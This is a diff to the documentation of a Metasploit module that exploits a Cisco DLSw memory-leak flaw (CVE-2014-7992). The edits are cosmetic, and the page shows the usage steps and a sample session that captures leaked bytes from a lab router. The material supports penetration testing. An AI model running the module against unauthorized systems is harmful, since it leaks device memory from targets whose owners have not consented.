@@ -6,7 +6,7 @@ This module implements the DLSw information disclosure retrieval. There is a bug
 
 1. Start msfconsole
 2. Do: `use modules/auxiliary/scanner/dlsw/dlsw_leak_capture`
-3. set `RHOSTS [ip]`
+3. Set: `RHOSTS [ip]`
 4. Do: `run`
 
 ## Scenarios
@@ -14,10 +14,10 @@ This module implements the DLSw information disclosure retrieval. There is a bug
 ### IOS version 12.4(8) and Kali Linux 2019.3
 
   ```
-  msf5 > use modules/auxiliary/scanner/dlsw/dlsw_leak_capture
-  msf5 auxiliary(scanner/dlsw/dlsw_leak_capture) > set RHOSTS 192.168.0.1
+  msf > use modules/auxiliary/scanner/dlsw/dlsw_leak_capture
+  msf auxiliary(scanner/dlsw/dlsw_leak_capture) > set RHOSTS 192.168.0.1
     RHOSTS => 192.168.0.1
-  msf5 auxiliary(scanner/dlsw/dlsw_leak_capture) > run
+  msf auxiliary(scanner/dlsw/dlsw_leak_capture) > run
     [*] 192.168.0.1:2067      - Checking for DLSw information disclosure (CVE-2014-7992)
     [+] 192.168.0.1:2067      - Vulnerable to DLSw information disclosure; leaked 72 bytes
     [*] 192.168.0.1:2067      - DLSw leaked data stored in /root/.msf4/loot/20191124231804_default_192.168.0.1_dlsw.packet.cont_518857.bin
